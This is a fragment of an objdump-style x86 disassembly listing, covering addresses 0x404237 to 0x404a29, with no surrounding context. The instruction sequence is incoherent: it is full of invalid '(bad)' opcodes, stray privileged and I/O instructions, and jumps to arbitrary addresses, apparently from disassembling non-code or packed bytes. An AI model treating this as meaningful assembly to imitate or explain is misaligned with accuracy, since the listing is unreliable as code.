  404237:	stos   BYTE PTR es:[edi],al
  404238:	pop    ecx
  404239:	mov    esi,0xfa46f045
  40423e:	into   
  40423f:	dec    ebp
  404240:	inc    esp
  404241:	ins    BYTE PTR es:[edi],dx
  404242:	xchg   edx,eax
  404243:	xchg   DWORD PTR [edx-0x73],edx
  404246:	mov    BYTE PTR [eax],al
  404248:	mov    eax,ds:0x3a926935
  40424d:	idiv   BYTE PTR [esi]
  40424f:	js     0x404297
  404251:	stos   BYTE PTR es:[edi],al
  404252:	fs mov esi,0xc6f6a25f
  404258:	iret   
  404259:	and    DWORD PTR [eax],edi
  40425b:	mov    ecx,DWORD PTR [edi]
  40425d:	fldcw  WORD PTR [ebx-0x54ab35f7]
  404263:	mov    ebp,0x3a9806c3
  404268:	xor    edx,DWORD PTR [eax-0x378d2dde]
  40426e:	(bad)  
  40426f:	add    al,0x1d
  404271:	or     dh,dl
  404273:	out    dx,al
  404274:	clc    
  404275:	(bad)  
  404276:	adc    al,0x45
  404278:	mov    ds,WORD PTR [esi+0xd]
  40427b:	aad    0x25
  40427d:	mov    ah,0x5f
  40427f:	test   DWORD PTR [esi+0x1389b6bd],esp
  404285:	jb     0x404221
  404287:	push   ebp
  404288:	sbb    edi,DWORD PTR [edi]
  40428a:	mov    dl,0x9
  40428c:	cmp    edx,esi
  40428e:	cli    
  40428f:	mov    ecx,0xb75f9279
  404294:	lods   al,BYTE PTR ds:[esi]
  404295:	inc    eax
  404296:	dec    DWORD PTR [edi-0x20a43252]
  40429c:	ja     0x4042d4
  40429e:	add    BYTE PTR [edx],0xfd
  4042a1:	lock shr BYTE PTR [ebp-0x5],1
  4042a5:	popf   
  4042a6:	call   0x5fac1f3d
  4042ab:	xchg   esp,eax
  4042ac:	or     eax,0xe199b1a0
  4042b1:	xor    eax,0xa2a47a62
  4042b6:	fnstcw WORD PTR [ecx+ebx*8+0x60]
  4042ba:	inc    edx
  4042bb:	rcl    esp,0x22
  4042be:	out    dx,al
  4042bf:	dec    ebp
  4042c0:	ss jae 0x404268
  4042c3:	adc    DWORD PTR [edi-0x6f6a8f85],esi
  4042c9:	mov    ebx,0xaab97171
  4042ce:	sub    eax,0xdd5dd63b
  4042d3:	mov    dl,0x49
  4042d5:	ins    BYTE PTR es:[edi],dx
  4042d6:	adc    eax,0x8507ad82
  4042db:	inc    edi
  4042dc:	mov    ebx,DWORD PTR [ecx-0x5f]
  4042df:	cmp    dh,cl
  4042e1:	sub    BYTE PTR [esi+0x64],al
  4042e4:	mov    esp,ss
  4042e6:	xchg   esp,edx
  4042e8:	push   eax
  4042e9:	popa   
  4042ea:	adc    eax,0xb1fb6caf
  4042ef:	ds mov edi,0x72d0d0c5
  4042f5:	adc    eax,0xcdd3f132
  4042fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042fb:	pop    edi
  4042fc:	dec    esi
  4042fd:	jmp    0xa6834588
  404302:	sbb    ch,BYTE PTR [ebx]
  404304:	push   edi
  404305:	xor    al,0x7e
  404307:	adc    esi,DWORD PTR [edi-0x76322d02]
  40430d:	lods   eax,DWORD PTR ds:[esi]
  40430e:	scas   al,BYTE PTR es:[edi]
  40430f:	add    al,0x4d
  404311:	xchg   edx,eax
  404312:	push   ebp
  404313:	loopne 0x404295
  404315:	test   DWORD PTR [ecx+ebx*2+0x22511004],ecx
  40431c:	inc    ecx
  40431d:	aam    0x67
  40431f:	push   esp
  404320:	cmp    edx,DWORD PTR [ecx+0x73]
  404323:	mov    al,0x96
  404325:	std    
  404326:	push   ds
  404327:	outs   dx,BYTE PTR ds:[esi]
  404328:	out    0xd1,al
  40432a:	aad    0x56
  40432c:	mov    ch,0xab
  40432e:	dec    ecx
  40432f:	mov    ds:0xd75c442b,al
  404334:	aad    0xed
  404336:	jmp    0x404301
  404338:	clc    
  404339:	bound  edx,QWORD PTR [ecx]
  40433b:	jl     0x404337
  40433d:	inc    ecx
  40433e:	add    cl,bl
  404340:	fidivr DWORD PTR [edx+0x675ea470]
  404346:	(bad)
  404349:	test   eax,0x445fa073
  40434f:	push   edx
  404350:	loope  0x4043a1
  404352:	(bad)  
  404353:	cdq    
  404354:	cld    
  404355:	cmp    BYTE PTR [edi+0x64b56eca],al
  40435b:	mov    ah,0x9d
  40435d:	jle    0x4042fc
  40435f:	pop    esi
  404360:	ins    BYTE PTR es:[edi],dx
  404361:	out    dx,eax
  404362:	out    0x4,eax
  404364:	ins    DWORD PTR es:[edi],dx
  404365:	out    0x88,al
  404367:	ret    0xfb25
  40436a:	(bad)  
  40436b:	in     al,dx
  40436c:	pop    ecx
  40436d:	add    DWORD PTR [esi+0x77],edi
  404370:	mov    dl,0xdf
  404372:	(bad)  
  404373:	mov    al,ds:0x193c1fae
  404378:	(bad)  
  404379:	int    0x5
  40437b:	jmp    0x4043f8
  40437d:	mov    ds:0x6b9e9dcd,al
  404382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404383:	mov    dl,0xd
  404385:	addr16 inc eax
  404387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404388:	and    eax,0xc3a0b29
  40438d:	push   0xf64eada
  404392:	test   BYTE PTR [edx+0x1b01621b],0xd8
  404399:	fs ins BYTE PTR es:[edi],dx
  40439b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40439c:	std    
  40439d:	xchg   ebx,eax
  40439e:	mov    bl,0xf6
  4043a0:	in     al,dx
  4043a1:	jae    0x404417
  4043a3:	and    al,0x58
  4043a5:	gs in  eax,0x2e
  4043a8:	ja     0x40441c
  4043aa:	pushf  
  4043ab:	fwait
  4043ac:	or     esp,eax
  4043ae:	inc    ecx
  4043af:	mov    dh,0x5
  4043b1:	jnp    0x404367
  4043b3:	test   DWORD PTR [ebx+ebp*4+0x2bca198c],0xd8ed8431
  4043be:	call   0x10db:0xd8402890
  4043c5:	hlt    
  4043c6:	push   cs
  4043c7:	pop    ss
  4043c8:	pop    ds
  4043c9:	xor    edi,DWORD PTR [edx+0x49]
  4043cc:	(bad)  
  4043cd:	pop    edx
  4043ce:	mov    DWORD PTR [esi-0x67],ebx
  4043d1:	pop    es
  4043d2:	adc    BYTE PTR [esi+0x3c],cl
  4043d5:	stos   DWORD PTR es:[edi],eax
  4043d6:	es cmc 
  4043d8:	cld    
  4043d9:	(bad)  [ebx]
  4043db:	push   ecx
  4043dc:	mov    esi,0xc747b344
  4043e1:	adc    al,0x81
  4043e3:	pop    eax
  4043e4:	dec    edx
  4043e5:	or     DWORD PTR [edi+ebp*4-0x76],ebx
  4043e9:	inc    ebx
  4043ea:	(bad)  
  4043eb:	lods   eax,DWORD PTR ds:[esi]
  4043ec:	cmp    DWORD PTR [esi-0x2a],0x33
  4043f0:	or     bl,0x75
  4043f3:	mov    edi,0xd79b91e1
  4043f8:	outs   dx,DWORD PTR ds:[esi]
  4043f9:	(bad)  
  4043fa:	cs mov ebx,0x7bd1b615
  404400:	stos   BYTE PTR es:[edi],al
  404401:	mov    ?,WORD PTR [ebp-0x64]
  404404:	jbe    0x40442a
  404406:	mov    ebp,0xe3aab9ff
  40440b:	or     eax,0x8b9065ff
  404410:	push   es
  404411:	test   eax,0xf1c5531e
  404416:	jno    0x40445c
  404418:	stc    
  404419:	mov    ds:0xa5fefd5,eax
  40441e:	test   DWORD PTR [ebp-0x53d78c60],esp
  404424:	mov    cl,dh
  404426:	imul   BYTE PTR [edi+0x49]
  404429:	add    al,0xde
  40442b:	xchg   esp,eax
  40442c:	pop    esp
  40442d:	sub    DWORD PTR [eax],ebp
  40442f:	stos   BYTE PTR es:[edi],al
  404430:	loop   0x40446b
  404432:	xor    DWORD PTR [esi+0x68],ebp
  404435:	mov    edx,0x941f132e
  40443a:	mov    eax,ds:0xa23a9016
  40443f:	jl     0x4043e4
  404441:	push   ds
  404442:	jnp    0x4043f4
  404444:	jl     0x4043fb
  404446:	(bad)  
  404447:	clc    
  404448:	sbb    al,0x17
  40444a:	imul   ebx,DWORD PTR [edx+0x52da72d7],0x95b24a57
  404454:	ret    0xd898
  404457:	dec    ecx
  404458:	or     eax,0x1ea2cc88
  40445d:	mov    al,0x13
  40445f:	aad    0x59
  404461:	sub    eax,0xdfa9edc8
  404466:	fisttp WORD PTR [ecx+0x28]
  404469:	mov    es,WORD PTR [ebp-0xb]
  40446c:	mov    ds:0x4ac12d0,al
  404471:	ds pushf 
  404473:	iret   
  404474:	lods   al,BYTE PTR ds:[esi]
  404475:	mov    BYTE PTR [eax+0xe549b23],dh
  40447b:	dec    esp
  40447c:	mov    bh,0xcc
  40447e:	frstor [edx-0x716308bb]
  404484:	sbb    eax,0xe4f967d7
  404489:	mov    eax,ds:0x66497f8c
  40448e:	or     BYTE PTR [ecx+edx*4-0x5463279b],cl
  404495:	std    
  404496:	popa   
  404497:	xchg   al,ah
  404499:	adc    DWORD PTR [edx-0x7b157aa6],0xffffffa9
  4044a0:	dec    edi
  4044a1:	jmp    0x4044c9
  4044a3:	or     eax,0xa858f0a9
  4044a8:	fldenv ds:0xced79a34
  4044ae:	xor    eax,0xa8f8723a
  4044b3:	int    0x26
  4044b5:	xor    eax,0xfd17f00a
  4044ba:	cmc    
  4044bb:	inc    esp
  4044bc:	cdq    
  4044bd:	lods   eax,DWORD PTR ds:[esi]
  4044be:	mov    ah,0xee
  4044c0:	retf   
  4044c1:	pushf  
  4044c2:	adc    al,BYTE PTR [eax]
  4044c4:	xor    eax,0x7df6e85f
  4044c9:	sbb    bh,BYTE PTR [edi+esi*8-0x653bc023]
  4044d0:	jecxz  0x404547
  4044d2:	repnz sbb bl,BYTE PTR [eax+ebp*1-0x34]
  4044d7:	cmp    BYTE PTR [eax],bl
  4044d9:	mov    ds:0x790813f9,al
  4044de:	retf   
  4044df:	mov    eax,ds:0x29e3b126
  4044e4:	xchg   ebp,eax
  4044e5:	es mov edi,0x36cd5504
  4044eb:	and    BYTE PTR [eax+eiz*2+0x5e],bl
  4044ef:	pop    ebx
  4044f0:	xchg   edx,eax
  4044f1:	add    DWORD PTR [ebx+0x6de35d65],ebp
  4044f7:	add    eax,0x93844266
  4044fc:	int    0xfa
  4044fe:	aas    
  4044ff:	fst    DWORD PTR [edx-0xa74a17d]
  404505:	or     DWORD PTR [edx+0x31],esp
  404508:	sar    DWORD PTR [ebx-0x4442981b],1
  40450e:	cmp    DWORD PTR [eax],edi
  404510:	dec    ebx
  404511:	sub    eax,0xa5e48907
  404516:	inc    esi
  404517:	nop
  404518:	add    BYTE PTR [eax],ch
  40451a:	imul   esi,edx,0xda59df80
  404520:	xchg   DWORD PTR [esp+ebp*1+0x47],edi
  404524:	mov    cl,0x1d
  404526:	inc    eax
  404527:	imul   edi,DWORD PTR [esi],0x34a54670
  40452d:	imul   esi,DWORD PTR [edi+eiz*8+0x5d],0xffffffbe
  404532:	or     bl,BYTE PTR ds:0x4e7228e6
  404538:	xchg   ebx,eax
  404539:	in     eax,dx
  40453a:	push   eax
  40453b:	or     ecx,DWORD PTR [ebx-0xc0b2a39]
  404541:	loop   0x404563
  404543:	sar    BYTE PTR [esi],cl
  404545:	mov    BYTE PTR [edx+0x72],dh
  404548:	sbb    esi,DWORD PTR [eax-0x40]
  40454b:	sbb    BYTE PTR [ecx-0x1a517bcc],dl
  404551:	inc    eax
  404552:	ss stc 
  404554:	or     BYTE PTR [edx+0x7a],bl
  404557:	ins    BYTE PTR es:[edi],dx
  404558:	mov    ds,WORD PTR [ebp+esi*8+0x3c336b84]
  40455f:	clc    
  404560:	sub    al,0xaa
  404562:	mov    ebp,0x72f46b87
  404567:	into   
  404568:	loop   0x40450d
  40456a:	xor    BYTE PTR [esi-0x4120760f],dh
  404570:	and    DWORD PTR [eax+ebx*4+0x18],edi
  404574:	or     eax,DWORD PTR [ebx+esi*4-0x6e]
  404578:	inc    ecx
  404579:	pop    ebp
  40457a:	sub    bh,BYTE PTR [edx+0x3c72dbda]
  404580:	mov    cl,0xdb
  404582:	sbb    DWORD PTR [bp+si],ebp
  404585:	push   ss
  404586:	enter  0x7613,0xc9
  40458a:	test   DWORD PTR [esi+0x1d],0x5eb45772
  404591:	cmp    BYTE PTR [ebx],bh
  404593:	inc    ebp
  404594:	call   0xc2c1d57d
  404599:	fisubr WORD PTR [ebx+0x127f4f0f]
  40459f:	pop    esp
  4045a0:	bound  ebp,QWORD PTR [edi]
  4045a2:	outs   dx,BYTE PTR ds:[esi]
  4045a3:	dec    esi
  4045a4:	xchg   ebp,eax
  4045a5:	sahf   
  4045a6:	mov    fs,esi
  4045a8:	mov    cl,0xd0
  4045aa:	clc    
  4045ab:	addr16 test ebx,ebx
  4045ae:	sbb    ebp,ecx
  4045b0:	jbe    0x40454a
  4045b2:	push   ds
  4045b3:	jp     0x4045b1
  4045b5:	xor    DWORD PTR [ebx+edi*4],esp
  4045b8:	fwait
  4045b9:	mov    cl,0x5d
  4045bb:	dec    esi
  4045bc:	cmp    DWORD PTR [esi-0x4f],eax
  4045bf:	int3   
  4045c0:	inc    esp
  4045c1:	cmp    ebx,DWORD PTR [ecx-0x2]
  4045c4:	push   esp
  4045c5:	popf   
  4045c6:	or     BYTE PTR [ebx],dh
  4045c8:	push   DWORD PTR [edi]
  4045ca:	scas   al,BYTE PTR es:[edi]
  4045cb:	push   esi
  4045cc:	inc    ecx
  4045cd:	clc    
  4045ce:	(bad)  
  4045cf:	test   BYTE PTR [eax-0x30],cl
  4045d2:	push   esi
  4045d3:	lea    ebx,[ecx+0x13]
  4045d6:	adc    al,0xf4
  4045d8:	add    bh,BYTE PTR [ebp+0x1b]
  4045db:	iret   
  4045dc:	jmp    0xa828:0xd838d8da
  4045e3:	add    ebp,DWORD PTR [edx-0x4eaef6ae]
  4045e9:	in     al,0xf4
  4045eb:	or     dl,BYTE PTR [eax+0x6f]
  4045ee:	shr    DWORD PTR [ecx-0x5b],0xe6
  4045f2:	mov    ch,0x3e
  4045f4:	loope  0x404628
  4045f6:	mov    edi,0x597f2ff9
  4045fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045fc:	aad    0xa4
  4045fe:	push   ecx
  4045ff:	or     DWORD PTR [edi+0x1f],edi
  404602:	outs   dx,BYTE PTR ds:[esi]
  404603:	test   ch,ah
  404605:	aaa    
  404606:	sbb    eax,0xa2dce023
  40460b:	push   ss
  40460c:	and    ah,bl
  40460e:	test   al,0x98
  404610:	stc    
  404611:	aas    
  404612:	inc    eax
  404613:	hlt    
  404614:	xchg   BYTE PTR ds:0x7ee85043,cl
  40461a:	pop    esp
  40461b:	mov    esp,0xc607e4d5
  404620:	lods   eax,DWORD PTR ds:[esi]
  404621:	test   DWORD PTR [eax-0x5c],esp
  404624:	xchg   BYTE PTR [eax-0x75],ch
  404627:	push   ebp
  404628:	cmp    eax,DWORD PTR [edi+0x2be93e83]
  40462e:	mov    bh,0xfc
  404630:	imul   esp,DWORD PTR [edi*8+0x3dad6f0c],0xffffffa4
  404638:	cmp    al,0xfd
  40463a:	pop    ds
  40463b:	outs   dx,BYTE PTR ds:[esi]
  40463c:	push   cs
  40463d:	aaa    
  40463e:	and    al,0xb2
  404640:	mov    eax,0xffc91df0
  404645:	pop    esi
  404646:	jo     0x4046ab
  404648:	js     0x404687
  40464a:	add    dh,0xc2
  40464d:	dec    esp
  40464e:	pop    es
  40464f:	pushw  es
  404651:	imul   esp,DWORD PTR [ecx+eiz*2],0x4a
  404655:	xor    DWORD PTR [ecx+0x4d],0xc90c0e26
  40465c:	(bad)  
  40465d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40465e:	pushf  
  40465f:	div    DWORD PTR [ecx-0x6fd1d53f]
  404665:	int    0xd5
  404667:	stc    
  404668:	mov    bh,ah
  40466a:	fcomp  QWORD PTR [ebx]
  40466c:	adc    al,0xa2
  40466e:	call   0xfdc7829a
  404673:	popf   
  404674:	add    eax,0x9082b715
  404679:	pop    es
  40467a:	lods   eax,DWORD PTR ds:[esi]
  40467b:	enter  0xea7a,0x4b
  40467f:	loop   0x40465c
  404681:	xor    ecx,DWORD PTR ds:0x73d6cb2f
  404687:	fmul   QWORD PTR [ecx]
  404689:	sahf   
  40468a:	push   es
  40468b:	cmp    dh,BYTE PTR [edi]
  40468d:	jbe    0x404688
  40468f:	shr    BYTE PTR [esi+0x2f6b115d],1
  404695:	xchg   ecx,eax
  404696:	mov    bl,0xcd
  404698:	pop    eax
  404699:	outs   dx,DWORD PTR ds:[esi]
  40469a:	jp     0x404679
  40469c:	call   0xfd96964
  4046a1:	mov    esi,0x52999f2e
  4046a6:	data16 shr ch,cl
  4046a9:	imul   DWORD PTR [edx+0x57688079]
  4046af:	aas    
  4046b0:	(bad)  
  4046b1:	(bad)  
  4046b3:	frstor [ebp+ecx*4-0x60]
  4046b7:	cmp    BYTE PTR [edi+0x31ee450d],cl
  4046bd:	jne    0x404669
  4046bf:	(bad)  
  4046c0:	std    
  4046c1:	hlt    
  4046c2:	or     al,0xb8
  4046c4:	mov    cl,bl
  4046c6:	lea    ebx,ds:0xe22e0da0
  4046cc:	sbb    al,0xc6
  4046ce:	cli    
  4046cf:	dec    edx
  4046d0:	les    edi,FWORD PTR [eax+0x516a5403]
  4046d6:	(bad)  
  4046d7:	jmp    0x5b279a30
  4046dc:	sub    BYTE PTR [eax-0x6f69dd43],dh
  4046e2:	cmp    cl,cl
  4046e4:	mov    bh,0x4f
  4046e6:	push   ebx
  4046e7:	cwde   
  4046e8:	lea    edi,[ebx-0x5477c600]
  4046ee:	aam    0x8e
  4046f0:	mov    edi,0x38eb2984
  4046f5:	xor    BYTE PTR [esi],bl
  4046f7:	int3   
  4046f8:	pop    edx
  4046f9:	cmc    
  4046fa:	shr    BYTE PTR [esi-0x53],cl
  4046fd:	dec    eax
  4046fe:	xchg   ebp,eax
  4046ff:	sti    
  404700:	cmp    ecx,DWORD PTR [edx+0x6102d6ad]
  404706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404707:	pop    esi
  404708:	xor    cl,bl
  40470a:	test   al,0x5a
  40470c:	ss rcl ah,cl
  40470f:	gs adc al,0x64
  404712:	sti    
  404713:	fist   WORD PTR [ebx]
  404715:	scas   eax,DWORD PTR es:[edi]
  404716:	jmp    DWORD PTR [ebx+0x3034bced]
  40471c:	aad    0x88
  40471e:	aad    0x44
  404720:	xor    eax,0x6595d543
  404725:	sbb    eax,0xff3b9696
  40472a:	idiv   BYTE PTR [ebx+edx*8]
  40472d:	fadd   DWORD PTR [edx+0x6dd5d2d1]
  404733:	mov    eax,0x134e68ee
  404738:	jae    0x4046d4
  40473a:	mov    edi,0x91fd7c15
  40473f:	cmp    al,BYTE PTR [ebx]
  404741:	mov    esi,0x24f9285
  404746:	push   edi
  404747:	out    0x4b,al
  404749:	les    edx,FWORD PTR [ecx-0x7f]
  40474c:	sub    eax,0x11b82602
  404751:	aas    
  404752:	or     BYTE PTR [esi+0x120a3c5d],dh
  404758:	imul   esp,DWORD PTR [esi],0x2b
  40475b:	stos   BYTE PTR es:[edi],al
  40475c:	sub    DWORD PTR [edx-0x669bdfa4],eax
  404762:	aas    
  404763:	jg     0x404780
  404765:	cmp    al,0x28
  404767:	outs   dx,BYTE PTR ds:[esi]
  404768:	inc    ecx
  404769:	xchg   ebp,eax
  40476a:	fstp   DWORD PTR [ebx-0x475dc1f0]
  404770:	mov    ds:0x8dbac8bf,eax
  404775:	sbb    BYTE PTR [esi+0x70ce8bdf],bh
  40477b:	(bad)  
  40477c:	mov    cl,0xe3
  40477e:	adc    ah,BYTE PTR [edx]
  404780:	lods   al,BYTE PTR ds:[esi]
  404781:	cs push eax
  404783:	dec    esi
  404784:	or     BYTE PTR [esi+0x374e467c],bl
  40478a:	aam    0x37
  40478c:	ret    0x28
  40478f:	bnd jmp 0xa0d03792
  404795:	not    BYTE PTR [edi-0x27b62587]
  40479b:	js     0x40472b
  40479d:	aas    
  40479e:	lds    edx,FWORD PTR [edi+esi*2-0x6533898d]
  4047a5:	iret   
  4047a6:	and    eax,0x95e12420
  4047ab:	lahf   
  4047ac:	xchg   esp,eax
  4047ad:	jnp    0x4047f1
  4047af:	ja     0x4047d9
  4047b1:	sahf   
  4047b2:	jne    0x40481d
  4047b4:	adc    edi,edi
  4047b6:	iret   
  4047b7:	add    ecx,eax
  4047b9:	mov    edx,0xdb300dc3
  4047be:	cmp    al,0x27
  4047c0:	add    edx,DWORD PTR [edx+0x62]
  4047c3:	xor    edx,DWORD PTR [edx+ebp*8-0x79]
  4047c7:	(bad)  
  4047c9:	pop    ecx
  4047ca:	stc    
  4047cb:	sbb    eax,0xbf8445ae
  4047d0:	xor    bl,ch
  4047d2:	cmp    eax,0x9e4d5867
  4047d7:	es leave 
  4047d9:	xor    edi,DWORD PTR [edi]
  4047db:	nop
  4047dc:	not    DWORD PTR [ebp+0x1]
  4047df:	inc    eax
  4047e0:	fs inc esi
  4047e2:	pop    edx
  4047e3:	cmp    eax,0xe8370e78
  4047e8:	jne    0x4047cb
  4047ea:	and    al,0x4b
  4047ec:	lds    ebx,FWORD PTR [ecx]
  4047ee:	aas    
  4047ef:	mov    BYTE PTR [edi],al
  4047f1:	arpl   WORD PTR [ebx],cx
  4047f3:	pop    eax
  4047f4:	adc    dl,BYTE PTR [eax-0x27188b78]
  4047fa:	pop    ebp
  4047fb:	sbb    ebp,DWORD PTR ds:[esi+0x43a2cc65]
  404802:	mov    al,ds:0xa2de6b21
  404807:	adc    BYTE PTR [eax],dh
  404809:	xchg   esi,eax
  40480a:	in     al,dx
  40480b:	jge    0x4047b4
  40480d:	inc    ecx
  40480e:	pop    ebx
  40480f:	fwait
  404810:	sar    DWORD PTR [ebp-0x16],0x85
  404814:	add    bl,0x7b
  404817:	sar    BYTE PTR [edi],cl
  404819:	xor    ecx,ebp
  40481b:	sbb    eax,DWORD PTR [ebp+0x7c]
  40481e:	nop
  40481f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404820:	mov    ah,dh
  404822:	stos   DWORD PTR es:[edi],eax
  404823:	data16 or al,0xbc
  404826:	cld    
  404827:	and    bh,BYTE PTR [ebp-0x4d304b02]
  40482d:	das    
  40482e:	ret    
  40482f:	repz mov ecx,0x79756c64
  404835:	mov    bl,0xa
  404837:	jg     0x4047ce
  404839:	ror    DWORD PTR [ebx+0x0],cl
  40483c:	inc    ebp
  40483d:	jno    0x40487a
  40483f:	mov    ds:0x15592ba,al
  404844:	retf   0xa892
  404847:	ret    
  404848:	test   al,0xa8
  40484a:	dec    esi
  40484b:	adc    DWORD PTR [ebp+edi*4+0xc],ebp
  40484f:	pop    esp
  404850:	or     eax,0x10407a5d
  404855:	neg    BYTE PTR [edx-0x70e41255]
  40485b:	push   ebp
  40485c:	push   edx
  40485d:	outs   dx,DWORD PTR ds:[esi]
  40485e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40485f:	and    ah,BYTE PTR [ebp+0x6ed5b7aa]
  404865:	(bad)  
  404866:	pop    ds
  404867:	jl     0x404817
  404869:	jmp    0x4048ab
  40486b:	mov    ebx,edi
  40486d:	cmp    ch,BYTE PTR [edi+0x4a]
  404870:	add    dh,bl
  404872:	mov    ecx,gs
  404874:	adc    ecx,DWORD PTR [ebx-0x23]
  404877:	retf   
  404878:	adc    DWORD PTR [ecx],eax
  40487a:	jge    0x40488c
  40487c:	dec    ebp
  40487d:	sbb    al,0x59
  40487f:	cwde   
  404880:	cmp    al,0xac
  404882:	aas    
  404883:	repnz xchg ecx,eax
  404885:	mov    eax,ds:0xa451bd52
  40488a:	mov    ch,0xc6
  40488c:	mov    ecx,0x7605e6ce
  404891:	jnp    0x40481a
  404893:	mov    ebp,ebp
  404895:	dec    esp
  404896:	addr16 out 0xed,al
  404899:	(bad)  
  40489a:	cmp    edi,DWORD PTR [esi]
  40489c:	dec    esp
  40489d:	mov    dl,0xeb
  40489f:	jl     0x40490c
  4048a1:	adc    edi,DWORD PTR [ebx+0x63]
  4048a4:	push   0x8a4ba70a
  4048a9:	inc    esp
  4048aa:	in     eax,0xa8
  4048ac:	imul   ecx,DWORD PTR [esi+0x14],0x73905250
  4048b3:	outs   dx,BYTE PTR ds:[esi]
  4048b4:	push   ds
  4048b5:	mov    edx,0x56b09f73
  4048ba:	out    dx,al
  4048bb:	test   BYTE PTR [edi+eiz*8+0x17],bh
  4048bf:	fstp   st(2)
  4048c1:	mov    ch,0x2e
  4048c3:	dec    edi
  4048c4:	loope  0x40484b
  4048c6:	pop    ss
  4048c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048c8:	xchg   edi,eax
  4048c9:	cmp    ah,BYTE PTR [ebx-0x477e7c12]
  4048cf:	es pop ebx
  4048d1:	lods   eax,DWORD PTR ds:[esi]
  4048d2:	push   ebx
  4048d3:	push   edx
  4048d4:	jno    0x4048c4
  4048d6:	sbb    al,0x34
  4048d8:	mov    ah,BYTE PTR [ebx-0x52]
  4048db:	mov    eax,DWORD PTR [edx]
  4048dd:	dec    ebx
  4048de:	jle    0x40487b
  4048e0:	sub    al,0x28
  4048e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048e3:	bnd jl 0x404892
  4048e6:	nop
  4048e7:	dec    esi
  4048e8:	into   
  4048e9:	jne    0x4048fe
  4048eb:	aam    0x75
  4048ed:	sub    esi,ebp
  4048ef:	xchg   DWORD PTR [ecx],edx
  4048f1:	repz adc ch,al
  4048f4:	xor    al,0x38
  4048f6:	shr    BYTE PTR [ebp+0x3e39216b],1
  4048fc:	cmp    al,BYTE PTR [esi-0x3773accf]
  404902:	imul   edi,DWORD PTR [edx],0xad253f25
  404908:	test   al,0x7c
  40490a:	mov    cs,WORD PTR ds:[ebp-0x21cb49fc]
  404911:	pop    ecx
  404912:	in     eax,dx
  404913:	das    
  404914:	xor    BYTE PTR [ecx],dh
  404916:	push   eax
  404917:	dec    ebx
  404918:	nop
  404919:	test   al,0xe9
  40491b:	adc    eax,0x21fb3c86
  404920:	cmp    WORD PTR [ecx],bp
  404923:	push   edi
  404924:	jns    0x4048e2
  404926:	or     esi,esi
  404928:	or     BYTE PTR [ebx+0x2b],0x3f
  40492c:	sbb    DWORD PTR [ecx+ecx*8],ecx
  40492f:	mov    ds:0xe89cf38a,eax
  404934:	call   0x6e0:0x40fcbb64
  40493b:	sti    
  40493c:	out    0xb7,al
  40493e:	xor    dh,cl
  404940:	add    esi,edi
  404942:	scas   al,BYTE PTR es:[edi]
  404943:	into   
  404944:	(bad)  
  404945:	cwde   
  404946:	sub    al,0x33
  404948:	inc    ebx
  404949:	nop
  40494a:	ins    BYTE PTR es:[edi],dx
  40494b:	repnz jecxz 0x40493e
  40494e:	or     bl,BYTE PTR [ecx+ebx*1+0x71987450]
  404955:	pop    es
  404956:	emms   
  404958:	push   ebp
  404959:	ja     0x404990
  40495b:	into   
  40495c:	adc    BYTE PTR [ecx+0x6d60622a],ah
  404962:	pop    ss
  404963:	adc    BYTE PTR [ebx+0x62],cl
  404966:	aad    0xac
  404968:	pusha  
  404969:	scas   al,BYTE PTR es:[edi]
  40496a:	dec    edx
  40496b:	mov    ebx,0xf20abf2a
  404970:	shr    BYTE PTR [esp+edx*4],0xd2
  404974:	sbb    DWORD PTR [ecx+0x3c023b96],0x20
  40497b:	jb     0x4049dd
  40497d:	out    0xd3,al
  40497f:	add    eax,0x3ff3b0a7
  404984:	mov    esi,0x888f8241
  404989:	cwde   
  40498a:	adc    edi,DWORD PTR [ebx+0x2bfaa569]
  404990:	loope  0x404959
  404992:	inc    edx
  404993:	fsub   DWORD PTR [eax]
  404995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404996:	adc    al,0x82
  404998:	loopne 0x404a19
  40499a:	or     eax,0x765717e4
  40499f:	(bad)  
  4049a0:	sbb    bl,BYTE PTR [edi]
  4049a2:	stc    
  4049a3:	call   0xfae2:0x6449656a
  4049aa:	add    eax,0x5a06e60e
  4049af:	and    eax,0xb9cfdb3c
  4049b4:	xchg   esi,eax
  4049b5:	jmp    0x4049c4
  4049b7:	fcom   DWORD PTR [esi+0x3a]
  4049ba:	cdq    
  4049bb:	daa    
  4049bc:	ja     0x4049e5
  4049be:	sub    BYTE PTR [ebp+0xd],dh
  4049c1:	cmp    BYTE PTR [ebx+0x34675536],al
  4049c7:	int3   
  4049c8:	loop   0x4049d6
  4049ca:	daa    
  4049cb:	rol    DWORD PTR ds:0x5a206467,cl
  4049d1:	push   ebx
  4049d2:	inc    eax
  4049d3:	daa    
  4049d4:	int    0xd5
  4049d6:	dec    ecx
  4049d7:	ret    0x1346
  4049da:	fistp  DWORD PTR [ebx+ecx*1+0x0]
  4049de:	pop    es
  4049df:	gs test eax,0x8584d094
  4049e5:	xchg   esi,eax
  4049e6:	daa    
  4049e7:	pop    esi
  4049e8:	imul   ebp,DWORD PTR [edx],0x36
  4049eb:	es sahf 
  4049ed:	retfw  
  4049ef:	adc    DWORD PTR [esi-0x3f19db65],edx
  4049f5:	fcompp 
  4049f7:	cmc    
  4049f8:	xor    DWORD PTR [edi-0x4d],0xffffffb7
  4049fc:	cmp    bl,cl
  4049fe:	jnp    0x404a15
  404a00:	dec    ebp
  404a01:	add    DWORD PTR [edx+0x409855d4],ebx
  404a07:	xchg   esp,eax
  404a08:	arpl   di,bp
  404a0a:	mov    eax,ds:0xfbbfe297
  404a0f:	fmulp  st(5),st
  404a11:	mov    ds:0xbadee24b,eax
  404a16:	mov    dh,0x6d
  404a18:	fsubr  DWORD PTR [edx+0x2d]
  404a1b:	in     al,dx
  404a1c:	or     eax,0x59f0adf5
  404a21:	bound  edi,QWORD PTR [edx+ecx*2+0x3deaaead]
  404a28:	(bad)  
  404a29:	mov    ebx,0xe0259f65
